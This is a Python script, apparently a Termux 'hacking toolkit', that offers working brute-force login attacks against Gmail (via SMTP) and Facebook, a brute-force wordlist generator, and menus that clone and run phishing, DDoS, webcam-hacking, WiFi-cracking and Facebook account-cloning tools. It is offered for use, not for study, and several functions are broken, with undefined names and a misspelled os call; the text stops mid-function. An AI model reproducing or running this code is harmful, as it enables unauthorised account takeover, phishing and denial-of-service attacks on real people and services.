#!/bin/python3
# -*- coding: utf-8 -*-
#creater: Faraz Ali ID
#_________[ IMPORTING MODULE ]_________>>
import re,os,sys,smtplib,requests,itertools,json,zipfile
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
from email import encoders
from g4rzk.module import *
from bs4 import BeautifulSoup as bs
from os import system as cmd
from os import listdir as lst
from sys import exit as exit
from sys import argv as arg
from time import sleep as slp
from random import randint as rr
from requests import get as get
#_________[ BASIC COLOURS ]_________>>
red = "\033[1;31m"
green = "\033[1;32m"
white = "\033[1;37m"
blue = "\033[1;35m"
#_________[ SCRIPT BANNER ]_________>>
bannerID = f"""{white}  [ creater : Faraz Ali ] [ Version : {green}0.0.1{white} ]
	  d888b         d88b        d8888b  
	 88  Y8b       8P  d8       88   8D 
{blue}	 88           88    88      88   88 
	 88  ooo      88    88      88   88 
{white}	 88   88       8b  d8       88   8D 
	  Y888P         Y88P        Y8888D"""
#_________[ BANNER DEF ]_________>>
def banner():
	cmd("clear")
	print(bannerID)
	print("--------------------------------------------------")
	print("    No Technology thats connected to internet")
	print("                is Unhackable")
	print("--------------------------------------------------")
#_________[ EMAIL BRUTE FORCE ]_________>>
def email_brute_force():
	loopX = 0
	banner()
	mailX = smtplib.SMTP_SSL("smtp.gmail.com",465)
	mailX.ehlo()
	email = input("[>>] Input email : ")
	passfile = input("[>>] Input Passlist : ")
	print("\n--------------------------------------------------")
	print(f"{green}     Process Is Started Please wait for Crack{white}")
	print("--------------------------------------------------\n")
	try:
		passfile = (open(passfile ,"r").read()).splitlines()
	except FileNotFoundError:
		exit(f"\n{red} Input File not Found{white}")
	for password in passfile:
		try:
			mailX.login(email, password)
			print(f"[{green}+{white}] Password Found > {password}")
			break
		except smtplib.SMTPAuthenticationError:
			loopX = loopX + 1
			print(f"[{red}+{white}] Password Not Found {str(loopX)} > {password}")
	input("\n[*] Process Completed - G O D ")
	slp(1)
	menu()
#_________[ FACEBOOK BRUTE FORCE ]_________>>
def create_form():
	form = dict()
	HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'}
	cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
	data = requests.get("https://www.facebook.com/login.php", headers=HEADERS)
	for i in data.cookies:
		cookies[i.name] = i.value
	data = bs(data.text, 'html.parser').form
	if data.input['name'] == 'lsd':
		form['lsd'] = data.input['value']
	return form, cookies
def is_this_a_password(email, index, password):
	PAYLOAD = {}
	COOKIES = {}
	HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'}
	if index % 10 == 0:
		PAYLOAD, COOKIES = create_form()
		PAYLOAD['email'] = email
	PAYLOAD['pass'] = password
	r = requests.post("https://www.facebook.com/login.php", data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
	if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
		open('temp', 'w').write(str(r.content))
		print(f"[{green}+{white}] Password Found > {password}")
		return True
	return False
def facebook_brute_force():
	loopX = 0
	banner()
	email = input('[+] Input facebook user : ').strip()
	PASSWORD_FILE = input("[+] Input PassList : ")
	try:
		password_data = open(PASSWORD_FILE, 'r').read().splitlines()
	except:
		exit(f"\n{red} Input File not Found{white}")
	print("\n--------------------------------------------------")
	print(f"{green}     Process Is Started Please wait for Crack{white}")
	print("--------------------------------------------------\n")
	for index, password in zip(range(password_data.__len__()), password_data):
		loopX = loopX + 1
		password = password.strip()
		if len(password) < 6:
			continue
		print(f"[{blue}+{white}] Trying Password {str(loopX)} > {password}")
		if is_this_a_password(email, index, password):
			break
	input("\n[*] Process Completed - G O D ")
	slp(1)
	menu()
#__________[ GODx99 ]_________>>
def godx99():
	input(f"\n{green}[*] Tool Is Successfully Installed - G O D {white}")
	slp(1)
	menu()
#__________[ HACKING_TOOLS ]_________>>
def hacking_x():
	banner()
	print("[01] Web Hacking")
	print("[02] Phishing")
	print("[03] Cam Hack")
	print("[04] Web Info")
	print("[05] Soial Enginner")
	print("[06] DDos Attack")
	print("[07] Wirless Attack")
	print("[00] Mein Menu ")
	print("--------------------------------------------------")
	choose = input("[>>] Input Your Option : ")
	if choose in ["01","1"]:
		webhacking()
	elif choose in ["02","2"]:
		Phishing()
	elif choose in ["03","3"]:
		camhack()
	elif choose in ["04","4"]:
		webinfo()
	elif choose in ["05","5"]:
		soial_Enginner()
	elif choose in ["06","6"]:
		DDos_Attack()
	elif choose in ["07","7"]:
		wirless_Attack()
	elif choose in ["00","0"]:
		slp(1)
		menu()
	else:
		slp(1)
		hacking_x()
#__________[ WEB HACK ]_________>>
def webhacking():
	banner()
	print("[01] brute-Force")
	print("[02] bruteX")
	print("[03] Brute-Boom")
	print("[04] Bruter")
	print("[05] FaceBook-Bruteforce")
	print("[06] WebHacking")
	print("[00] Main Menu")
	print("--------------------------------------------------")
	choose2 = input("[>>] Input Your Option : ")
	if choose2 in ["01","1"]:
		banner()
		cmd("git clone https://github.com/mrprogrammer2938/Brute-Force")
		godx99()
	elif choose2 in ["02","2"]:
		banner()
		cmd("git clone https://github.com/1N3/BruteX")
		godx99()
	elif choose2 in ["03","3"]:
		banner()
		cmd("git clone https://github.com/Oseid/FaceBoom")
		godx99()
	elif choose2 in ["04","4"]:
		banner()
		cmd("git clone https://github.com/AzizKpln/Bruter19")
		godx99()
	elif choose2 in ["05","5"]:
		banner()
		cmd("git clone https://github.com/IAmBlackHacker/Facebook-BruteForce")
		godx99()
	elif choose2 in ["06","6"]:
		banner()
		cmd("https://github.com/yan4ikyt/webhack")
		godx99()
	elif choose2 in ["00","0"]:
		slp(1)
		hacking_x()
	else:
		slp(1)
		webhacking()
#__________[ PHISHING ]_________>>
def Phishing():
	banner()
	print("[01] setoolkit")
	print("[02] zphisher")
	print("[03] nex-Phisher")
	print("[04] Social Phish")
	print("{05] Black-phish")
	print("[06] Phish-Mailer")
	print("[00] Mein Menu")
	print("--------------------------------------------------")
	choose4 = input("[>>] Input Your Option : ")
	if choose4 in ["01","1"]:
		banner()
		cmd("git clone https://github.com/trustedsec/social-engineer-toolkit/ setoolkit/")
		godx99()
	elif choose4 in ["02","2"]:
		banner()
		cmd("git clone https://github.com/htr-tech/zphisher")
		godx99()
	elif choose4 in ["03","3"]:
		banner()
		cmd("git clone https://github.com/htr-tech/nexphisher")
		godx99()
	elif choose4 in ["04","4"]:
		banner()
		cmd("git clone https://github.com/xHak9x/SocialPhish")
		godx99()
	elif choose4 in ["05","5"]:
		banner()
		cmd("git clone https://github.com/iinc0gnit0/BlackPhish")
		godx99()
	elif choose4 in ["06","6"]:
		banner()
		cmd("git clone https://github.com/BiZken/PhishMailer")
		godx99()
	elif choose4 in ["0","00"]:
		slp(1)
		hacking_x()
	else:
		slp(1)
		Phishing()
#_________[ WIRELESS ATTACK ]________>>
def wirless_Attack():
	banner()
	print("[01] wifite")
	print("[02] Airattackit")
	print("[03] wifispy")
	print("[04] wifi-God")
	print("[05] wifi-cracker")
	print("[06] Mein Menu")
	print("--------------------------------------------------")
	choose5 = input("[>>] Input Your Option : ")
	if choose5 in ["01","1"]:
		banner()
		cmd("git clone https://github.com/derv82/wifite")
		godx99()
	elif choose5 in ["02","2"]:
		banner()
		cmd("git clone https://github.com/JoyGhoshs/Airattackit")
	elif choose5 in ["03","3"]:
		banner()
		cmd("git clone https://github.com/AresS32/wirespy")
		godx99()
	elif choose5 in ["04","4"]:
		banner()
		cmd("git clone https://github.com/waseem-sajjad/WifiGod")
		godx99()
	elif choose5 in ["05","5"]:
		banner()
		cmd("git clone https://github.com/brannondorsey/wifi-cracking")
		godx99()
	elif choose5 in ["00","0"]:
		hacking_x()
	else:
		slp(1)
		wirless_Attack()
#__________[ DDOS ATTACK ]_________>>
def DDos_Attack():
	banner()
	print("[01] DDos-Attack")
	print("[02] hammer")
	print("[03] Liteddos")
	print("[04] Rave-Tool")
	print("[05] DDos-Attack-Mrx")
	print("[00] Mein Menu")
	print("--------------------------------------------------")
	choose8 = input("[>>] Input Your Option : ")
	if choose8 in ["01","1"]:
		banner()
		cmd("git clone https://github.com/mrprogrammer2938/DDos-Attack")
		godx99()
	elif choose8 in ["02","2"]:
		banner()
		cmd("git clone https://github.com/cyweb/hammer")
		godx99()
	elif choose8 in ["03","3"]:
		banner()
		cmd("git clone https://github.com/4L13299/LITEDDOS")
		godx99()
	elif choose8 in ["04","4"]:
		banner()
		cmd("git clone https://github.com/Taguar258/Raven-Storm/ Rave-Tool/")
		godx99()
	elif choose8 in ["05","5"]:
		banner()
		cmd("git clone https://github.com/Ha3MrX/DDos-Attack/ DDos-Attack-Mrx/")
		godx99()
	elif choose8 in ["00","0"]:
		slp(1)
		hacking_x()
	else:
		slp(1)
		DDos_Attack()
#____________[ SOCIAL ENGINEERING ]________>>
def soial_Enginner():
	banner()
	print("[01] setoolkit")
	print("[02] focial")
	print("[03] fluxion")
	print("[04] Insta Hack")
	print("[00] Mein Menu")
	print("--------------------------------------------------")
	choose7 = input("[>>] Input Your Option : ")
	if choose7 in ["01","1"]:
		banner()
		cmd("git clone https://github.com/trustedsec/social-engineer-toolkit/ setoolkit/")
		godx99()
	elif choose7 in ["02","2"]:
		banner()
		cmd("git clone https://github.com/v2-dev/awesome-social-engineering/ focial/")
		godx99()
	elif choose7 in ["03","3"]:
		banner()
		cmd("git clone https://github.com/FluxionNetwork/fluxion")
		godx99()
	elif choose7 in ["04","4"]:
		banner()
		cmd("git clone https://github.com/fuck3erboy/instahack")
		godx99()
	elif choose7 in ["00","0"]:
		hacking_x()
	else:
		slp(1)
		soial_Enginner()
#___________[ CAMEHACK ]________>>
def camhack():
	banner()
	print("[01] Cam-Hackers")
	print("[02] Cam-Hack-ang")
	print("[03] say cheese")
	print("[04] say Master")
	print("[05] Cam-Phish")
	print("[06] Mein Menu")
	print("--------------------------------------------------")
	choose3 = input("[>>] Input Your Option : ")
	if choose3 in ["01","1"]:
		banner()
		cmd("git clone https://github.com/mrprogrammer2938/Cam-Hackers")
		godx99()
	elif choose3 in ["02","2"]:
		banner()
		cmd("git clone https://github.com/AngelSecurityTeam/Cam-Hackers")
		godx99()
	elif choose3 in ["03","3"]:
		banner()
		cmd("git clone https://github.com/keralahackers/saycheese")
		godx99()
	elif choose3 in ["04","4"]:
		banner()
		cmd("git clone https://github.com/joshkar/SayMaster")
		godx99()
	elif choose3 in ["05","5"]:
		banner()
		cmd("git clone https://github.com/techchipnet/CamPhish/ Cam-Phish/")
		godx99()
	elif choose3 in ["00","0"]:
		slp(1)
		hacking_x()
	else:
		slp(1)
		camhack()
#__________[ WEB INFO ]__________>>
def webinfo():
	banner()
	print("[01] Web-Info")
	print("[02] setookit")
	print("[03] webkiller")
	print("[04] web informtion")
	print("[05] Th3inspector")
	print("[00] Main Menu")
	print("--------------------------------------------------")
	choose6 = input("[>>] Input Your Option : ")
	if choose6 in ["01","1"]:
		banner()
		cmd("git clone https://github.com/mrprogrammer2938/Web-Info")
		godx99()
	elif choose6 in ["02","2"]:
		banner()
		cmd("git clone https://github.com/trustedsec/social-engineer-toolkit")
		godx99()
	elif choose6 in ["03","3"]:
		banner()
		cmd("git clone https://github.com/ultrasecurity/webkiller")
		godx99()
	elif choose6 in ["04","4"]:
		banner()
		cmd("git clone https://github.com/zahidin/web-information-gathering")
		godx99()
	elif choose6 in ["05","5"]:
		banner()
		cmd("git clone https://github.com/Moham3dRiahi/Th3inspector")
		godx99()
	elif choose6 in ["00","0"]:
		slp(1)
		hacking_x()
	else:
		slp(1)
		webinfo()
#__________[ OTHER HACKING TOOL KITS ]________>>
def hacktool():
	banner()
	print("[01] Hacking-Tools")
	print("[02] Hack-Tools")
	print("[03] fsociety")
	print("[04] PTool")
	print("[05] onex")
	print("[06] Kit Hack")
	print("[07] Hacking")
	print("[08] M3MO")
	print("[00] Mein Menu")
	print("--------------------------------------------------")
	choose7 = input("[>>] Input Your Option : ")
	if choose7 in ["01","1"]:
		banner()
		cmd("git clone https://github.com/mrprogrammer2938/hackingtools")
		godx99()
	elif choose7 in ["02","2"]:
		banner()
		cmd("git clone https://github.com/Z4nzu/hackingtool")
		godx99()
	elif choose7 in ["03","3"]:
		banner()
		cmd("git clone https://github.com/Manisso/fsociety")
		godx99()
	elif choose7 in ["04","4"]:
		banner()
		cmd("git clone https://github.com/mrprogrammer2938/PTool")
		try6()
	elif choose7 in ["05","5"]:
		banner()
		cmd("git clone https://github.com/rajkumardusad/onex")
		godx99()
	elif choose7 in ["06","6"]:
		banner()
		cmd("git clone https://github.com/AdrMXR/KitHack")
		godx99()
	elif choose7 in ["07","7"]:
		banner()
		os.sytem("git clone https://github.com/Ha3MrX/Hacking")
		godx99()
	elif choose7 in ["08","8"]:
		banner()
		cmd("git clone https://github.com/mrwn007/M3M0")
		godx99()
	elif choose7 in ["00","0"]:
		slp(1)
		menu()
	else:
		slp(1)
		hacktool()
#___________[ FACEBOOK CLONING TOOL ]__________>>
def fb_clone():
	banner()
	print("[01] KingQadir - uid")
	print("[02] Hannan-404 - TEST")
	print("[03] XERX-XD - RXN")
	print("[04] USMAN-RAJPOOT - NOTHING")
	print("[05] Pavel-Mahmud-Alif - BAHA-PRO")
	print("[06] SEXY-RIKI-404 - RD")
	print("[07] FARAZ-ID - Test")
	print("[08] hop09 - hpro")
	print("[09] hop09 - file")
	print("[10] REFAT-156 - RNDM")
	print("[11] Hackerrv33 - rahulrbc")
	print("[12] ShahWahid0785 - random-afg")
	print("[13] Sarfraz-Ssb SSB")
	print("[14] AKING110 - AKING-PRO")
	print("[15] syedzada1100 - Crack-Pro")
	print("[16] JUTTBRAND - pro")
	print("[17] ANONYMOUS-U7P4L - File")
	print("[18] essasoomro - jaadu")
	print("[19] FaisalRehman111 - faisal")
	print("[20] AHMADOAFRIDI - FILE_CLONING")
	print("[21] XAIVER-XD - KLEIN")
	print("[22] binyaminbinni - bxi")
	print("[23] Mr-Qureshi-xd - KING")
	print("[00] Main Menu")
	print("--------------------------------------------------")
	fbc = input("[>>] Input Your Option : ")
	if fbc in ["01","1"]:
		print("\n----------------------------------------------")
		print(f"          {blue}Installing Tool Please Wait{white}")
		print("----------------------------------------------")
		cmd("""pkg update -y
pkg upgrade -y
pkg install git -y
pkg install python -y
pip install requests
pip install mechanize
rm -rf uid
git clone https://github.com/KingQadir/uid.git
cd uid
python Qadir.py""")
	elif fbc in ["02","2"]:
		print("\n----------------------------------------------")
		print(f"          {blue}Installing Tool Please Wait{white}")
		print("----------------------------------------------")
		cmd("""rm -rf TEST
git clone https://github.com/Hannan-404/TEST
cd TEST
python Test.py""")
	elif fbc in ["03","3"]:
		print("\n----------------------------------------------")
		print(f"          {blue}Installing Tool Please Wait{white}")
		print("----------------------------------------------")
		cmd("""apt update -y
apt upgrade -y
pkg install python -y
pkg install git -y
pip unistall requests
pip install requests bs4 rich mechanize 
git clone https://github.com/XERX-XD/RXN
cd RXN
python rxn.py""")
	elif fbc in ["04","4"]:
		print("\n----------------------------------------------")
		print(f"          {blue}Installing Tool Please Wait{white}")
		print("----------------------------------------------")
		cmd("""git clone https://github.com/USMAN-RAJPOOT/NOTHING
cd NOTHING 
python USMAN.py""")
	elif fbc in ["05","5"]:
		print("\n----------------------------------------------")
		print(f"          {blue}Installing Tool Please Wait{white}")
		print("----------------------------------------------")
		cmd("""$ pkg update
pkg upgrade -y
pkg install python -y
pkg install python2 -y
pip install requests
pip install mechanize
pip install bs4
pip install rich
pkg install git -y
pip uninstall requests chardet urllib3 idna certifi -y
pip install chardet urllib3 idna certifi requests
rm -rf BAHA-PRO
git clone https://github.com/Pavel-Mahmud-Alif/BAHA-PRO
cd BAHA-PRO
python run.py""")
	elif fbc in ["06","6"]:
		print("\n----------------------------------------------")
		print(f"          {blue}Installing Tool Please Wait{white}")
		print("----------------------------------------------")
		cmd("""git clone https://github.com/SEXY-RIKI-404/RD
cd RD
python Random.py""")
	elif fbc in ["07","7"]:
		print("\n----------------------------------------------")
		print(f"          {blue}Installing Tool Please Wait{white}")
		print("----------------------------------------------")
		cmd("""git clone https://github.com/FARAZ-ID/Test.git
cd Test
python Test.py""")
	elif fbc in ["08","8"]:
		print("\n----------------------------------------------")
		print(f"          {blue}Installing Tool Please Wait{white}")
		print("----------------------------------------------")
		cmd("""termux-setup-storage
pkg update 
pkg install python git -y
rm -rf hpro
git clone https://github.com/hop09/hpro
cd hpro
python hop.py""")
	elif fbc in ["09","9"]:
		print("\n----------------------------------------------")
		print(f"          {blue}Installing Tool Please Wait{white}")
		print("----------------------------------------------")
		cmd("""termux-setup-storage
pkg update 
pkg install python git -y
rm -rf file
git clone https://github.com/hop09/file
cd file
python file.py""")
	elif fbc in ["10","010"]:
		print("\n----------------------------------------------")
		print(f"          {blue}Installing Tool Please Wait{white}")
		print("----------------------------------------------")
		cmd("""rm -rf RNDM
git clone https://github.com/REFAT-156/RNDM.git
cd RNDM
python Rndm.py""")
	elif fbc in ["11","011"]:
		print("\n----------------------------------------------")
		print(f"          {blue}Installing Tool Please Wait{white}")
		print("----------------------------------------------")
		cmd("""rm -rf rahulrbc
git clone --depth=1 https://github.com/Hackerrv33/rahulrbc
cd rahulrbc
python RAHUL.py""")
	elif fbc in ["12","012"]:
		print("\n----------------------------------------------")
		print(f"          {blue}Installing Tool Please Wait{white}")
		print("----------------------------------------------")
		cmd("""rm -rf random-afg
git clone https://github.com/ShahWahid0785/random-afg.git
cd random-afg
ls
python Random.py""")
	elif fbc in ["13","013"]:
		print("\n----------------------------------------------")
		print(f"          {blue}Installing Tool Please Wait{white}")
		print("----------------------------------------------")
		cmd("""rm -rf SSB
git clone --depth=1  https://github.com/Sarfraz-Ssb/SSB
cd SSB
python SSB.py""")
	elif fbc in ["14","014"]:
		print("\n----------------------------------------------")
		print(f"          {blue}Installing Tool Please Wait{white}")
		print("----------------------------------------------")
		cmd("""rm -rf AKING-PRO
git clone --depth=1 https://github.com/AKING110/AKING-PRO.git
cd AKING-PRO
python AKING.py""")
	elif fbc in ["15","015"]:
		print("\n----------------------------------------------")
		print(f"          {blue}Installing Tool Please Wait{white}")
		print("----------------------------------------------")
		cmd("""pkg update -y
pkg upgrade -y
pkg install git -y
pkg install python -y
pip install requests
pip install mechanize
pip install bs4
pip install future
rm -rf Crack-Pro
git clone https://github.com/syedzada1100/Crack-Pro.git
cd Crack-Pro
git pull 
python Syed.py""")
	elif fbc in ["16","016"]:
		print("\n----------------------------------------------")
		print(f"          {blue}Installing Tool Please Wait{white}")
		print("----------------------------------------------")
		cmd("""pkg update -y
pkg upgrade -y
pkg install git -y
pkg install python -y
pip install bs4
pip install rich 
pip install mechanize
pip install requests 
rm -rf pro
git clone https://github.com/JUTTBRAND/pro
cd pro
python JXB.py""")
	elif fbc in ["17","017"]:
		print("\n----------------------------------------------")
		print(f"          {blue}Installing Tool Please Wait{white}")
		print("----------------------------------------------")
		cmd("""git clone https://github.com/ANONYMOUS-U7P4L/File.git
cd File
python File.py""")
	elif fbc in ["18","018"]:
		print("\n----------------------------------------------")
		print(f"          {blue}Installing Tool Please Wait{white}")
		print("----------------------------------------------")
		cmd("""git clone https://github.com/essasoomro/jaadu.git
cd jaadu
python XYZ.py""")
	elif fbc in ["19","019"]:
		print("\n----------------------------------------------")
		print(f"          {blue}Installing Tool Please Wait{white}")
		print("----------------------------------------------")
		cmd("""termux-setup-storage
pkg update -y
pkg upgrade -y
pkg install python -y
pkg install git -y
pip install bs4
pip install requests
pip install rich
pip install FLAST
rm -rf faisal
git clone https://github.com/FaisalRehman111/faisal
cd faisal
python faisy.py""")
	elif fbc in ["20","020"]:
		print("\n----------------------------------------------")
		print(f"          {blue}Installing Tool Please Wait{white}")
		print("----------------------------------------------")
		cmd("""rm -rf FILE_CLONING
git clone https://github.com/AHMADOAFRIDI/FILE_CLONING
cd FILE_CLONING
python FILE1.py""")
	elif fbc in ["21","021"]:
		print("\n----------------------------------------------")
		print(f"          {blue}Installing Tool Please Wait{white}")
		print("----------------------------------------------")
		cmd("""rm -rf KLEIN
git clone https://GitHub.com/XAIVER-XD/KLEIN
cd KLEIN
python KLEIN.py""")
	elif fbc in ["22","022"]:
		print("\n----------------------------------------------")
		print(f"          {blue}Installing Tool Please Wait{white}")
		print("----------------------------------------------")
		cmd("""rm -rf bxi
git clone https://gitHub.com/binyaminbinni/bxi
cd bxi
chmod 777 bxi
./bxi""")
	elif fbc in ["23","023"]:
		print("\n----------------------------------------------")
		print(f"          {blue}Installing Tool Please Wait{white}")
		print("----------------------------------------------")
		cmd("""rm -rf KING
git clone https://github.com/Mr-Qureshi-xd/KING
cd KING
git pull 
python KING.py""")
	elif fbc in ["00","0"]:
		slp(1)
		menu()
	else:
		slp(1)
		fb_clone()
#_____________[ WEH GET HEADER ]__________>>
def webheader():
	banner()
	print(f" [{blue}+{white}] Example : https://google.com/ ")
	print(f" [{blue}+{white}] Example2 : https://m.facebook.com/ ")
	print("--------------------------------------------------")
	url = input("[+] Input website url : ")
	req = requests.get(url)
	data = {}
	head = req.headers
	usls = ['cookie','set-cookie','report-to','expires','x-fb-debug','date','last-modified','etag']
	for x,y in zip(head.keys(),head.values()):
		try:
			if x.lower() in usls: continue
			else: data.update({x:y})
		except Exception as e:continue
	print(f"\n-----------------[{green} H E A D E R {white}]------------------")
	print(data)
	print("--------------------------------------------------")
	input("[+] Enter for main menu - G O D ")
	slp(1)
	menu()
#_____________[ PASSWORD LIST GENERATER V1]___________>>
def createWordList():
	banner()
	chrs = input("[+] Enter Characters for Passlist : ")
	try:
		min_length = int(input("[+] Input Minimum Password length : "))
	except ValueError:
		min_length = 4
	try:
		max_length = int(input("[+] Input Maximum Password length : "))
	except ValueError:
		max_length = 6
	outputX = input("[+] PassList Save as : ")
	output = open(outputX, 'w')
	print("--------------------------------------------------")
	print(f"          {blue}Process In Started Please Wait{white}")
	print("--------------------------------------------------")
	slp(2)
	for n in range(min_length, max_length + 1):
		for xs in itertools.product(chrs, repeat=n):
			chars = ''.join(xs)
			output.write("%s\n" % chars)
			print(chars)
	lines_Pass = len((open(outputX,"r").read()).splitlines())
	output.close()
	print("--------------------------------------------------")
	print(f"[{blue}+{white}] PassList Save As : {outputX}")
	print(f"[{blue}+{white}] Total Passwords : {str(lines_Pass)}")
	print(f"[{blue}+{white}] Length - Minimum / Maximum : {str(min_length)} / {str(max_length)}")
	print("--------------------------------------------------")
	input("[+] Enter for main menu - G O D ")
	slp(1)
	menu()
#___________[ LOCK ID SEPARATER ]_________>>
def fb_lock():
	banner()
	token = ""
	cookie = ""
	print(f" [{blue}+{white}] Example : /sdcard/OK.txt ")
	print("--------------------------------------------------")
	file_ids = input("[+] Input File FB OK IDs : ")
	show_lock = input("[+] Doyou Wait to print Lock IDs (y/n) : ")
	print("\n--------------------------------------------------")
	print(f"          {blue}Process In Started Please Wait{white}")
	print("--------------------------------------------------")
	try:
		ids = (open(file_ids,"r").read()).splitlines()
	except FileNotFoundError:
		print("\n[+] File Not Found")
		slp(1.5)
		menu()
	for ID in ids:
		uid,name = ID.split("|")
		requests.Session()
		data = sess.get(f'https://graph.facebook.com/{uid}?fields=name,id&access_token={token}',cookies=cookie).text
		data = json.loads(data)
		try:
			namee = data["name"]
			idd = data["id"]
			print(f"{green}[OK] {uid} | {name}{white}")
		except:
			if (show_lock.lower()) == "y":
				print(f"{red}[TL] {uid} | {name}{white}")
	print("--------------------------------------------------")
	input("[+] Enter for main menu - G O D ")
	slp(1)
	menu()
#_____________[ SEARCH URL X ]________>>
def search_url_x():
	banner()
	text_search = (input("[+] Input text for Search : ")).replace(" ","+")
	url_main = (f"https://www.google.com/search?q={text_search}")
	print("\n--------------------------------------------------")
	print(f"          {blue}Process In Started Please Wait{white}")
	print("--------------------------------------------------")
	soup = parser(ses.get(f"{url_main}", headers={"user-agent": "chrome"}).text, "html.parser")
	for form in soup.find_all("div", class_="egMi0 kCrYT"):
		regex_title = re.search(r'<h3 class=".*?"><div class=".*?">(.*?)<\/div>', str(form))
		regex_url = re.search(r'<div class=".*?"><a href\=\"\/(.*?)\">', str(form))
		print(f"\n{green}[+] Title : {regex_title.group(1)}{white}")
		urlX = str(regex_url.group(1))
		urlX = (urlX.replace("url?q=","")).split("&amp")[0]
		print(f"[+] Web URL : {urlX}")
	print("--------------------------------------------------")
	input("[+] Enter for main menu - G O D ")
	slp(1)
	menu()
#____________[ IP INFORMATION GATHERING ]_______>>
def ip_info():
	banner()
	user_ip = input("[+] Input Target IP Address : ")
	urlY= (f"http://ip-api.com/json/{user_ip}?lang=en")
	print("--------------------------------------------------")
	print(f"          {blue}Process In Started Please Wait{white}")
	print("--------------------------------------------------")
	sess = requests.Session()
	data = sess.get(urlY).text
	data = json.loads(data)
	for key,values in data.items():
		print(f"[{green}+{white}] {str(key).capitalize()} : {str(values).capitalize()}")
	print("--------------------------------------------------")
	input("[+] Enter for main menu - G O D ")
	slp(1)
	menu()
#____________[ KALI NET HUNTER ( ROOTLESS ) ]_________>>
def kali_nethunter():
	banner()
	print(f"[{green}+{white}] Installing Kali Net Hunter Please - Wait")
	cmd("""termux-setup-storage
pkg install wget
wget -O install-nethunter-termux https://offs.ec/2MceZWr
chmod +x install-nethunter-termux
./install-nethunter-termux""")
	input("[+] Enter for main menu - G O D ")
	slp(1)
	menu()
#_______________[ TERMUX BASIC COMMANDS ]_________>>
def basic_termux():
	banner()
	print("\n--------------------------------------------------")
	print(f"          {blue}Process In Started Please Wait{white}")
	print("--------------------------------------------------")
	print("[*] Termux Permission Allow Notification  ")
	cmd("termux-setup-storage")
	print("[*]  Updating All Install Packages  ")
	cmd("pkg update && pkg upgrade")
	print("[*] Installing Python  ")
	cmd("pkg install python -y")
	print("[*] Installing Python 2  ")
	cmd("pkg install python2 -y")
	print("[*] Installing Python 3  ")
	cmd("pkg install python3 -y")
	print("[*] Installing Python-Pip  ")
	cmd("pkg install python-pip")
	print("[*] Installing Wget ")
	cmd("pkg install wget -y")
	print("[*] Installing Fish  ")
	cmd("pkg install fish -y")
	print("[*] Installing Ruby  ")
	cmd("pkg install ruby -y")
	print("[*] Installing Termux Help  ")
	cmd("pkg install help -y")
	print("[*] Installing Git  ")
	cmd("pkg install git -y")
	print("[*] Installing Dnsutils  ")
	cmd("pkg install dnsutils -y")
	print("[*] Installing Php  ")
	cmd("pkg install php -y")
	print("[*] Installing Perl  ")
	cmd("pkg install perl -y")
	print("[*] Installing Lua  ")
	cmd("pkg install lua -y")
	print("[*] Installing Parallel  ")
	cmd("pkg install parallel -y")
	print("[*] Installing Nmap  ")
	cmd("pkg install nmap -y")
	print("[*] Installing Bash  ")
	cmd("pkg install bash -y")
	print("[*] Installing Clang  ")
	cmd("pkg install clang -y")
	print("[*] Installing Nano  ")
	cmd("pkg install nano -y")
	print("[*] Installing W3M  ")
	cmd("pkg install w3m -y")
	print("[*] Installing Hydra  ")
	cmd("pkg install hydra -y")
	print("[*] Installing Figlet  ")
	cmd("pkg install figlet -y")
	print("[*] Installing Cowsay  ")
	cmd("pkg install cowsay -y")
	print("[*] Installing Curl  ")
	cmd("pkg install curl -y")
	print("[*] Installing Tar  ")
	cmd("pkg install tar -y")
	print("[*] Installing Zip  ")
	cmd("pkg install zip -y")
	print("[*] Installing Unzip  ")
	cmd("pkg install unzip -y")
	print("[*] Installing Net-Tool  ")
	cmd("pkg install net-tools -y")
	print("[*] Installing Tor  ")
	cmd("pkg install tor -y")
	print("[*] Installing Sudo  ")
	cmd("pkg install sudo -y")
	print("[*] Installing WireShark  ")
	cmd("pkg install wireshark -y")
	print("[*] Installing Wgetrc  ")
	cmd("pkg install wgetrc -y")
	print("[*] Installing Wcalc  ")
	cmd("pkg install wcalc -y")
	print("[*] Installing OpenSSL  ")
	cmd("pkg install openssl -y")
	print("[*] Installing OpenSSL Tool  ")
	cmd("pkg install openssl-tool -y")
	print("[*] Installing Bmon  ")
	cmd("pkg install bmon -y")
	print("[*] Installing VPN  ")
	cmd("pkg install vpn -y")
	print("[*] Installing  Toilet  ")
	cmd("pkg install toilet -y")
	print("[*] Installing Unrar ")
	cmd("pkg install unrar -y")
	print("[*] Installing Proot ")
	cmd("pkg install proot -y")
	print("[*] Installing  Net-Toots ")
	cmd("pkg install net-tools -y")
	print("[*] Installing  Vem")
	cmd("pkg install vim -y")
	print("[*] Installing Ired ")
	cmd("pkg install ired -y")
	print("[*] Installing Php ")
	cmd("pip install php && pip2 install php")
	print("[*] Installing Mechanize ")
	cmd("pip install mechanize && pip2 install mechanize")
	print("[*] Installing Requests ")
	cmd("pip2 install requests && pip install requests")
	print("[*] Installing FakeRoot ")
	cmd("pkg install fakeroot -y")
	print("[*] Installing Bs4 ")
	cmd("pip install bs4 && pip2 install bas4")
	print("--------------------------------------------------")
	input("[+] Enter for main menu - G O D ")
	slp(1)
	menu()
#_________[ MAIN_MENU ]_________>>
def menu():
	banner()
	print("[01] Gmail Brute Force ")
	print("[02] Facebook Brute Force ")
	print("[03] G O D Hacking ToolKit Lite")
	print("[04] Download Other Hacking ToolKits")
	print("[05] Facebook Cloning Commands")
	print("[06] Copy Website GET Header")
	print("[07] Password List Generator V1")
	print("[08] Facebook OK / TL Account Separator")
	print("[09] Search URL / TITLE From Google")
	print("[10] Collect Target IP Information")
	print("[11] Install Kali Net Hunter Rootless")
	print("[12] Install Termux Basic Commands")
	print("-------------------------------------------------")
	menu_inp = input(f"[{blue}>>{white}] Input Your Option : ")
	if menu_inp in ["01","1"]:
